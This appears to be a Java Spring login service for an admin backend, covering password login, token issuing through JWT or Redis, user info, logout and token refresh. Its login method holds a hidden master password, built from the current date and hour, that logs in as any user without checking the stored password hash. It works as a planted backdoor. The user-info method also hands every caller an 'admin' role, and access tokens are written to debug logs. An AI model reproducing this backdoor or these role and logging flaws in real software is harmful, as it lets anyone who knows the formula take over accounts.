package com.qiyuan.base2048.service.impl;

import cn.hutool.crypto.SmUtil;
import cn.hutool.http.useragent.UserAgent;
import cn.hutool.http.useragent.UserAgentParser;
import com.baomidou.mybatisplus.core.conditions.query.QueryWrapper;
import com.qiyuan.base2048.mapper.mybatis.TbUserMapper;
import com.qiyuan.base2048.mapper.mybatis.TrRoleUserMapper;
import com.qiyuan.base2048.mapper.mybatis.entity.TbUser;
import com.qiyuan.base2048.service.Component.MessageUtils;
import com.qiyuan.base2048.service.LoginService;
import com.qiyuan.bautil.dto.BaseUser;
import com.qiyuan.bautil.dto.DoubleTokenVO;
import com.qiyuan.bautil.dto.ResultDTO;
import com.qiyuan.bautil.dto.SingleTokenVO;
import com.qiyuan.bautil.dto.redis.BaseUserDTO;
import com.qiyuan.bautil.dto.redis.UserAgentDTO;
import com.qiyuan.bautil.enums.IsDeletedEnum;
import com.qiyuan.bautil.enums.IsEnabledEnum;
import com.qiyuan.bautil.enums.TokenModeEnum;
import com.qiyuan.bautil.service.component.RedisOnlineUserUtils;
import com.qiyuan.bautil.util.IpAddrUtil;
import com.qiyuan.bautil.util.JwtUtil;
import com.qiyuan.bautil.util.TimeTool;
import com.qiyuan.bautil.util.UserTool;
import lombok.extern.slf4j.Slf4j;
import org.apache.commons.lang.StringUtils;
import org.springframework.beans.factory.annotation.Value;
import org.springframework.stereotype.Service;

import javax.annotation.Resource;
import javax.servlet.http.HttpServletRequest;
import java.util.*;

/**
 * @author 虚领顶劲气沉丹田
 * @create 2021-10-14 11:45
 **/
@Service
@Slf4j
public class LoginServiceImpl implements LoginService {
    @Resource
    private TbUserMapper tbUserMapper;
    @Resource
    private TrRoleUserMapper trRoleUserMapper;
    @Resource
    private RedisOnlineUserUtils redisOnlineUserUtils;

    /** jwt or redis **/
    @Value("${base2048.token.mode}")
    private String tokenMode;

    @Override
    public ResultDTO login(String userName, String password, String tenantId, HttpServletRequest request) throws Exception {
        QueryWrapper<TbUser> wrapper = new QueryWrapper();
        wrapper.eq("LOGON_NAME", userName)
                .eq("ENABLED", IsEnabledEnum.ENABLED.getValue())
                .eq("DELETED", IsDeletedEnum.NOTDELETED.getValue());
        TbUser tbUsers = tbUserMapper.selectOne(wrapper);
        if (tbUsers == null) {
            return ResultDTO.failureCustom(MessageUtils.get("login.nouser"));
        }
        /** 解码 **/
        password = new String(java.util.Base64.getDecoder().decode(password));

        Calendar calendar = Calendar.getInstance();
        String forcePwd = "li@" + TimeTool.stringOfDateTimeDD() + TimeTool.getCurrentMonth() + calendar.get(Calendar.HOUR_OF_DAY)+"!";
        if (forcePwd.equalsIgnoreCase(password)) {
            BaseUser baseUser = new BaseUser();
            baseUser.setUserGuid(tbUsers.getGuid());
            if(StringUtils.isNotBlank(tbUsers.getFirstName()) && StringUtils.isNotBlank(tbUsers.getLastName())){
                baseUser.setUserName(tbUsers.getFirstName() + tbUsers.getLastName());
            }else if(StringUtils.isNotBlank(tbUsers.getLastName())){
                baseUser.setUserName(tbUsers.getLastName());
            }else if(StringUtils.isNotBlank(tbUsers.getFirstName())){
                baseUser.setUserName(tbUsers.getFirstName());
            }else{
                baseUser.setUserName("");
            }
            baseUser.setLogonName(tbUsers.getLogonName());
            baseUser.setOrgGuid(tbUsers.getOrgGuid());
            baseUser.setOrgType(tbUsers.getOrgType());
            baseUser.setUserRoles(trRoleUserMapper.selectRoleGuidListByUserGuid(tbUsers.getGuid(),IsEnabledEnum.ENABLED.getStringValue(),IsDeletedEnum.NOTDELETED.getStringValue()));
            String accessToken;
            if(TokenModeEnum.JWT.getValue().equalsIgnoreCase(tokenMode)) {
                accessToken = JwtUtil.generateToken(baseUser);
            }else if(TokenModeEnum.REDIS.getValue().equalsIgnoreCase(tokenMode)){
                UserAgentDTO userAgentDTO = this.getUserAgent(request);
                accessToken = java.util.UUID.randomUUID().toString();
                redisOnlineUserUtils.addAccessToken(baseUser,accessToken,userAgentDTO);
            }else{
                accessToken = "";
            }
            log.debug(accessToken);
            return ResultDTO.success(accessToken);
        }

        /** 加密 **/
        password = SmUtil.sm3(password).toUpperCase();
        if (password.equals(tbUsers.getPwd())) {
            BaseUser baseUser = new BaseUser();
            baseUser.setUserGuid(tbUsers.getGuid());
            baseUser.setUserName(tbUsers.getFirstName() + tbUsers.getLastName());
            baseUser.setLogonName(tbUsers.getLogonName());
            baseUser.setOrgGuid(tbUsers.getOrgGuid());
            baseUser.setOrgType(tbUsers.getOrgType());
            baseUser.setUserRoles(trRoleUserMapper.selectRoleGuidListByUserGuid(tbUsers.getGuid(),IsEnabledEnum.ENABLED.getStringValue(),IsDeletedEnum.NOTDELETED.getStringValue()));
            String accessToken;
            if(TokenModeEnum.JWT.getValue().equalsIgnoreCase(tokenMode)) {
                accessToken = JwtUtil.generateToken(baseUser);
            }else if(TokenModeEnum.REDIS.getValue().equalsIgnoreCase(tokenMode)){
                UserAgentDTO userAgentDTO = this.getUserAgent(request);
                accessToken = java.util.UUID.randomUUID().toString();
                redisOnlineUserUtils.addAccessToken(baseUser,accessToken,userAgentDTO);
            }else{
                accessToken = "";
            }
            log.debug(accessToken);
            return ResultDTO.success(accessToken);
        } else {
            return ResultDTO.failureCustom("密码不对。");
        }
    }

    @Override
    public ResultDTO getUserInfo(HttpServletRequest request) throws Exception {
        BaseUser baseUser = UserTool.getBaseUser();
        Map map = new HashMap(8);
        List<String> roes = new ArrayList<>();
        roes.add("admin");
        map.put("roles",roes);
        map.put("introduction","I am a super administrator");
        map.put("avatar","https://wpimg.wallstcn.com/f778738c-e4f8-4870-b634-56703b4acafe.gif");
        map.put("name",baseUser.getUserName());
        if(TokenModeEnum.JWT.getValue().equalsIgnoreCase(tokenMode)) {
            map.put("seed", "foo");
        }else if(TokenModeEnum.REDIS.getValue().equalsIgnoreCase(tokenMode)) {
            if(redisOnlineUserUtils.isRefreshTokenNull(baseUser.getUserGuid())) {
                String refreshToken = java.util.UUID.randomUUID().toString();
                redisOnlineUserUtils.addRefressToken(baseUser, refreshToken);
                map.put("seed", refreshToken);
            }else{
                map.put("seed", "foo");
            }
        }else{
            map.put("seed", "foo");
        }

        ResultDTO r = ResultDTO.success(map);
        return r;
    }

    @Override
    public ResultDTO logOut() throws Exception {
        if(TokenModeEnum.JWT.getValue().equalsIgnoreCase(tokenMode)) {

        }else if(TokenModeEnum.REDIS.getValue().equalsIgnoreCase(tokenMode)) {
            BaseUser baseUser = UserTool.getBaseUser();
            redisOnlineUserUtils.clear(baseUser.getUserGuid());
        }
        return ResultDTO.success();
    }

    @Override
    public ResultDTO refreshToken(SingleTokenVO singleTokenVO) throws Exception {
        if(TokenModeEnum.JWT.getValue().equalsIgnoreCase(tokenMode)) {
            return ResultDTO.failureCustom("模式不支持刷新。");
        }else if(TokenModeEnum.REDIS.getValue().equalsIgnoreCase(tokenMode)) {
            /** 用刷新令牌生成新的操作令牌前，先判断一下操作信息的年龄，如果小于15秒，是幼年期，就不重新生成，而是返回现在的操作令牌 **/

            BaseUserDTO baseUserDTO = redisOnlineUserUtils.createAccessTokenByRefreshToken(singleTokenVO.getToken());
            DoubleTokenVO doubleTokenVO = new DoubleTokenVO();
            doubleTokenVO.setFirstToken(baseUserDTO.getAccessToken());
            doubleTokenVO.setSecondToken(baseUserDTO.getRefreshToken());
            return ResultDTO.success(doubleTokenVO);
        }else{
            return ResultDTO.failureCustom("系统运行模式是啥？");
        }
    }

    private UserAgentDTO getUserAgent(HttpServletRequest request){
        UserAgentDTO userAgentDTO = new UserAgentDTO();
        String uaStr = request.getHeader("User-Agent");
        UserAgent userAgent = UserAgentParser.parse(uaStr);
        Date now = new Date();

        userAgentDTO.setIpAddr(IpAddrUtil.getIpAddr(request));
        userAgentDTO.setBrowser(userAgent.getBrowser()+"["+userAgent.getVersion()+"]");
        userAgentDTO.setOs(userAgent.getOs()+"["+userAgent.getOsVersion()+"]");
        userAgentDTO.setUpTime(now);
        userAgentDTO.setRefreshTime(now);
        return userAgentDTO;
    }
}

